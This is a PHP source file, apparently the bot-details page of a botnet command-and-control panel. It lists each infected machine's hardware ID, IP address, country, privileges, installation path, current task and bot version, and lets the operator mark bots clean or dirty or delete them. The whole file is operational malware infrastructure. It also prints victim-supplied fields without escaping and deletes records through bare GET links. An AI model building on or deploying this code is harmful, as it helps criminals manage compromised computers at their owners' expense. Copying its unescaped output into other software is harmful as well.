<?php
include_once('./includes/header.php');
?>
		
			<main>
  <div class="container">
    <h1 class="thin">Bot Details</h1>
    <!--  Tables Section-->
    <div id="messages" class="mailbox section">
      <div class="row">
				
						<?php
						if (isset($_GET['id']))
						{
							if (!ctype_digit($_GET['id']))
							{
								echo '<div class="alert alert-danger">Specified ID is not valid. Redirecting...</div><meta http-equiv="refresh" content="2;url=?p=bots">';
								die();
							}else{
								$cnt = $odb->prepare("SELECT COUNT(*) FROM bots WHERE id = :id");
								$cnt->execute(array(":id" => $_GET['id']));
								if (!($cnt->fetchColumn(0) > 0))
								{
									echo '<div class="alert alert-danger">Specified ID was not found in database. Redirecting...</div><meta http-equiv="refresh" content="2;url=?p=bots">';
									die();
								}
							}
							if (isset($_GET['del']) && $_GET['del'] == "1")
							{
								$del = $odb->prepare("DELETE FROM bots WHERE id = :id LIMIT 1");
								$del->execute(array(":id" => $_GET['id']));
								$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
								$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Deleted bot #'.$_GET['id']));
								echo '<div class="alert alert-success">Bot deleted successfully. Redirecting...</div><meta http-equiv="refresh" content="2;url=?p=bots">';
								die();
							}
							if (isset($_GET['mark']))
							{
								$m = $_GET['mark'];
								if ($m == "1")
								{
									$mark = $odb->prepare("UPDATE bots SET mark = :mark WHERE id = :id LIMIT 1");
									$mark->execute(array(":mark" => "1", ":id" => $_GET['id']));
									echo '<div class="alert alert-success">Bot marked successfully.Redirecting...</div><meta http-equiv="refresh" content="2;url=?p=details&id='.$_GET['id'].'">';
								}elseif ($m == "2"){
									$mark = $odb->prepare("UPDATE bots SET mark = :mark WHERE id = :id LIMIT 1");
									$mark->execute(array(":mark" => "2", ":id" => $_GET['id']));
									echo '<div class="alert alert-success">Bot marked successfully.Redirecting...</div><meta http-equiv="refresh" content="2;url=?p=details&id='.$_GET['id'].'">';
								}
							}
						}
						?>
					</div>
					
						<span class="right"><a href="?p=bots"><i class="mdi-content-backspace"></i> Go back</a><br></span>
						<table class="table table-condensed table-hover table-striped table-bordered">
							<thead>
								<tr>
									<th width="50%">Key</th>
									<th width="50%">Value</th>
								</tr>
							</thead>
							<?php
							$details = $odb->prepare("SELECT * FROM bots WHERE id = :id");
							$details->execute(array(":id" => $_GET['id']));
							$d = $details->fetch(PDO::FETCH_ASSOC);
							?>
							<tbody>
								<tr><td>ID</td><td><?php echo $d['id']; ?></td></tr>
								<tr><td>HWID</td><td><?php echo $d['bothwid']; ?></td></tr>
								<tr><td>IP Address</td><td><?php echo $d['ipaddress']; ?></td></tr>
								<tr><td>Country</td><td><?php echo geoip_country_name_by_id($gi, $d['country']); echo '&nbsp;&nbsp;<img src="assets/images/flags/'.strtolower(geoip_country_code_by_id($gi, $d['country'])).'.png" />'; ?></td></tr>
								<tr><td>Install Date</td><td><?php echo date("m-d-Y, h:i A", $d['installdate']); ?></td></tr>
								<tr><td>Last Response</td><td><?php echo date("m-d-Y, h:i A", $d['lastresponse']); ?></td></tr>
								<tr><td>Current Task</td><td>#<?php echo $d['currenttask']; ?></td></tr>
								<tr><td>Computer Name</td><td><?php echo base64_decode($d['computername']); ?></td></tr>
								<tr><td>Operating System</td><td><?php echo $d['operatingsys']; ?></td></tr>
								<tr><td>Privileges</td><td><?php echo $d['privileges']; ?></td></tr>
								<tr><td>Installation Path</td><td><?php echo base64_decode($d['installationpath']); ?></td></tr>
								<tr><td>Last Reboot</td><td><?php echo base64_decode($d['lastreboot']); ?></td></tr>
								<tr><td>Bot Version</td><td><?php echo $d['botversion']; ?></td></tr>
							</tbody>
						</table>
						<center>
						<?php
						if ($d['mark'] == "1")
						{
							echo '<h5>This bot is marked as <font style="color: green;">Clean</font></h5><br><a class="btn btn-danger" href="?p=details&id='.$_GET['id'].'&mark=2">Mark bot as dirty</a>';
						}else{
							echo '<h5>This bot is marked as <font style="color: red;">Dirty</font></h5><br><a class="btn btn-success" href="?p=details&id='.$_GET['id'].'&mark=1">Mark bot as clean</a>';
						}
						?>
						<a href="?p=details&id=<?php echo $_GET['id']; ?>&del=1" class="btn btn-danger">Delete Bot</a>
						</center>
					</div>
					</div>

					

		</main>
<?php include_once("./includes/footer.php"); 
?>		
				